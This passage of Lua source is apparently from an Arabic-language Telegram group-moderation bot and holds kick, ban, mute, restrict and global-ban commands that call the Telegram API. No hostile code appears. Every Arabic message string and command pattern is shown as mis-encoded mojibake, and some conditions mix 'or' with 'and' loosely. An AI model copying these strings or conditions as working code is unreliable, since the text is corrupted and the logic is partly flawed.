Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุทุฑุฏ โซ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธูุง ุงุณุชุทูุน ุทุฑุฏ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุทุฑุฏู ูู ุงููุฌููุนู")  
end,nil)
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^ุทุฑุฏ (%d+)') and ChCheck(msg) then
local user = text:match('ุทุฑุฏ (%d+)')
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ุงูููุดุฆูู')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุทุฑุฏ โซ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธูุง ุงุณุชุทูุน ุทุฑุฏ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุทุฑุฏู ูู ุงููุฌููุนู")  
end,nil)
end
end
end 
--          Ban           --
if Admin(msg) then
if text ==('ุญุถุฑ') or text ==('ุญุธุฑ') and ChCheck(msg) then
function BanReply(extra, result, success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ุงูููุดุฆูู')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุญุธุฑ โซ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธูุง ุงุณุชุทูุน ุญุธุฑ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
Devmfm:sadd(mustafa..'mfm:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุญุธุฑู ูู ุงููุฌููุนู") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and (text:match('^ุญุถุฑ @(.*)') or text:match('^ุญุธุฑ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุญุถุฑ @(.*)') or text:match('^ุญุธุฑ @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ุงูููุดุฆูู')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุญุธุฑ โซ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธูุง ุงุณุชุทูุน ุญุธุฑ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
Devmfm:sadd(mustafa..'mfm:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุญุธุฑู ูู ุงููุฌููุนู")  
end,nil) 
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and (text:match('^ุญุถุฑ (%d+)') or text:match('^ุญุธุฑ (%d+)')) and ChCheck(msg) then
local user = text:match('ุญุถุฑ (%d+)') or text:match('ุญุธุฑ (%d+)')
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ุงูููุดุฆูู')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุญุธุฑ โซ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธูุง ุงุณุชุทูุน ุญุธุฑ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(msg.chat_id_, user)
Devmfm:sadd(mustafa..'mfm:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุญุธุฑู ูู ุงููุฌููุนู")  
end,nil) 
end
end
--         UnBan          --
if text ==('ุงูุบุงุก ุงูุญุธุฑ') or text ==('ุงูุบุงุก ุญุธุฑ') and ChCheck(msg) then
function UnBanReply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุงูุบุงุก ุญุธุฑู ูู ุงููุฌููุนู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and (text:match('^ุงูุบุงุก ุงูุญุธุฑ @(.*)') or text:match('^ุงูุบุงุก ุญุธุฑ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงูุบุงุก ุงูุญุธุฑ @(.*)') or text:match('^ุงูุบุงุก ุญุธุฑ @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุงูุบุงุก ุญุธุฑู ูู ุงููุฌููุนู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and (text:match('^ุงูุบุงุก ุงูุญุธุฑ (%d+)') or text:match('^ุงูุบุงุก ุญุธุฑ (%d+)')) and ChCheck(msg) then
local user = text:match('ุงูุบุงุก ุงูุญุธุฑ (%d+)') or text:match('ุงูุบุงุก ุญุธุฑ (%d+)')
Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุงูุบุงุก ุญุธุฑู ูู ุงููุฌููุนู")  
end 
end 
--          Mute          --
if Admin(msg) then
if text ==('ูุชู') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงููุชู ูุงูุชููุฏ ูู ูุจู ุงูููุดุฆูู')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ูุชู โซ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธูู ุจุงููุนู ููุชูู ูู ุงููุฌููุนู")  
else
Devmfm:sadd(mustafa..'mfm:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ูุชูู ูู ุงููุฌููุนู")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^ูุชู @(.*)') and ChCheck(msg) then
local username = text:match('^ูุชู @(.*)')
function MuteUser(extra,result,success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงููุชู ูุงูุชููุฏ ูู ูุจู ุงูููุดุฆูู')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ูุชู โซ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","โ๏ธูู ุจุงููุนู ููุชูู ูู ุงููุฌููุนู")  
else
Devmfm:sadd(mustafa..'mfm:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ูุชูู ูู ุงููุฌููุนู")  
end
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^ูุชู (%d+)') and ChCheck(msg) then
local user = text:match('ูุชู (%d+)')
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงููุชู ูุงูุชููุฏ ูู ูุจู ุงูููุดุฆูู')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ูุชู โซ '..IdRank(user, msg.chat_id_), 1, 'md')
else
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","โ๏ธูู ุจุงููุนู ููุชูู ูู ุงููุฌููุนู")  
else
Devmfm:sadd(mustafa..'mfm:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ูุชูู ูู ุงููุฌููุนู")  
end
end
end
--         UnMute         --
if text ==('ุงูุบุงุก ุงููุชู') or text ==('ุงูุบุงุก ูุชู') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธูู ููุณ ููุชูู ูุงูุบุงุก ูุชูู")  
else
Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุงูุบุงุก ูุชูู ูู ุงููุฌููุนู")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and (text:match('^ุงูุบุงุก ุงููุชู @(.*)') or text:match('^ุงูุบุงุก ูุชู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงูุบุงุก ุงููุชู @(.*)') or text:match('^ุงูุบุงุก ูุชู @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","โ๏ธูู ููุณ ููุชูู ูุงูุบุงุก ูุชูู")  
else
Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุงูุบุงุก ูุชูู ูู ุงููุฌููุนู")  
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and (text:match('^ุงูุบุงุก ุงููุชู (%d+)') or text:match('^ุงูุบุงุก ูุชู (%d+)')) and ChCheck(msg) then
local user = text:match('ุงูุบุงุก ุงููุชู (%d+)') or text:match('ุงูุบุงุก ูุชู (%d+)')
if not Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","โ๏ธูู ููุณ ููุชูู ูุงูุบุงุก ูุชูู")  
else
Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุงูุบุงุก ูุชูู ูู ุงููุฌููุนู")  
end
end 
end 
--          Tkeed           --
if Admin(msg) then
if text ==('ุชูููุฏ') or text ==('ุชููุฏ') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงููุชู ูุงูุชููุฏ ูู ูุจู ุงูููุดุฆูู')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุชููุฏ โซ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชููุฏู ูู ุงููุฌููุนู")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and (text:match('^ุชูููุฏ @(.*)') or text:match('^ุชููุฏ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุชูููุฏ @(.*)') or text:match('^ุชููุฏ @(.*)')
function TkeedUser(extra,result,success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงููุชู ูุงูุชููุฏ ูู ูุจู ุงูููุดุฆูู')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุชููุฏ โซ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชููุฏู ูู ุงููุฌููุนู")  
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and (text:match('^ุชูููุฏ (%d+)') or text:match('^ุชููุฏ (%d+)')) and ChCheck(msg) then
local user = text:match('ุชูููุฏ (%d+)') or text:match('ุชููุฏ (%d+)')
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงููุชู ูุงูุชููุฏ ูู ูุจู ุงูููุดุฆูู')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุชููุฏ โซ '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชููุฏู ูู ุงููุฌููุนู")  
end
end
--         UnTkeed          --
if text ==('ุงูุบุงุก ุชูููุฏ') or text ==('ุงูุบุงุก ุชููุฏ') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุงูุบุงุก ุชููุฏู ูู ุงููุฌููุนู")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and (text:match('^ุงูุบุงุก ุชูููุฏ @(.*)') or text:match('^ุงูุบุงุก ุชููุฏ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงูุบุงุก ุชูููุฏ @(.*)') or text:match('^ุงูุบุงุก ุชููุฏ @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุงูุบุงุก ุชููุฏู ูู ุงููุฌููุนู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and (text:match('^ุงูุบุงุก ุชูููุฏ (%d+)') or text:match('^ุงูุบุงุก ุชููุฏ (%d+)')) and ChCheck(msg) then
local user = text:match('ุงูุบุงุก ุชูููุฏ (%d+)') or text:match('ุงูุบุงุก ุชููุฏ (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุงูุบุงุก ุชููุฏู ูู ุงููุฌููุนู")  
end
end 
end
--         BanAll         --
if SecondSudo(msg) then
if text ==('ุญุถุฑ ุนุงู') or text ==('ุญุธุฑ ุนุงู') then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ุญุธุฑ ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
Devmfm:sadd(mustafa..'mfm:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุญุธุฑู ุนุงู ูู ุงููุฌููุนุงุช")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and (text:match('^ุญุถุฑ ุนุงู @(.*)') or text:match('^ุญุธุฑ ุนุงู @(.*)')) then
local username = text:match('^ุญุถุฑ ุนุงู @(.*)') or text:match('^ุญุธุฑ ุนุงู @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ุญุธุฑ ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
Devmfm:sadd(mustafa..'mfm:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุญุธุฑู ุนุงู ูู ุงููุฌููุนุงุช")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and (text:match('^ุญุถุฑ ุนุงู (%d+)') or text:match('^ุญุธุฑ ุนุงู (%d+)')) then
local user = text:match('ุญุถุฑ ุนุงู (%d+)') or text:match('ุญุธุฑ ุนุงู (%d+)')
if tonumber(user) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ุญุธุฑ ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(user) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ุญุธุฑ ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
Devmfm:sadd(mustafa..'mfm:BanAll:', user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุญุธุฑู ุนุงู ูู ุงููุฌููุนุงุช")  
end
--         MuteAll        --
if text ==('ูุชู ุนุงู') then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ูุชู ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
Devmfm:sadd(mustafa..'mfm:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ูุชูู ุนุงู ูู ุงููุฌููุนุงุช")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^ูุชู ุนุงู @(.*)') then
local username = text:match('^ูุชู ุนุงู @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ูุชู ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
if result.id_ then
Devmfm:sadd(mustafa..'mfm:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ูุชูู ุนุงู ูู ุงููุฌููุนุงุช")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^ูุชู ุนุงู (%d+)') then
local user = text:match('ูุชู ุนุงู (%d+)')
if tonumber(user) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ูุชู ุงูุจูุช ุนุงู*", 1, 'md')
return false 
end
if SudoId(user) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชุณุชุทูุน ูุชู ุงููุทูุฑ ุงูุงุณุงุณู*", 1, 'md')
return false 
end
Devmfm:sadd(mustafa..'mfm:MuteAll:', user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ูุชูู ุนุงู ูู ุงููุฌููุนุงุช")  
end
--         UnAll          --
if text ==('ุงูุบุงุก ุนุงู') or text ==('ุงูุบุงุก ุงูุนุงู') then
function UnAllReply(extra, result, success)
Devmfm:srem(mustafa..'mfm:BanAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุงูุบุงุก (ุงูุญุธุฑ โข ุงููุชู) ุนุงู ูู ุงููุฌููุนุงุช")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and (text:match('^ุงูุบุงุก ุนุงู @(.*)') or text:match('^ุงูุบุงุก ุงูุนุงู @(.*)')) then
local username = text:match('^ุงูุบุงุก ุนุงู @(.*)') or text:match('^ุงูุบุงุก ุงูุนุงู @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:BanAll:', result.id_)
Devmfm:srem(mustafa..'mfm:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุงูุบุงุก (ุงูุญุธุฑ โข ุงููุชู) ุนุงู ูู ุงููุฌููุนุงุช")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and (text:match('^ุงูุบุงุก ุนุงู (%d+)') or text:match('^ุงูุบุงุก ุงูุนุงู (%d+)')) then
local user = text:match('ุงูุบุงุก ุนุงู (%d+)') or text:match('ุงูุบุงุก ุงูุนุงู (%d+)')
Devmfm:srem(mustafa..'mfm:BanAll:', user)
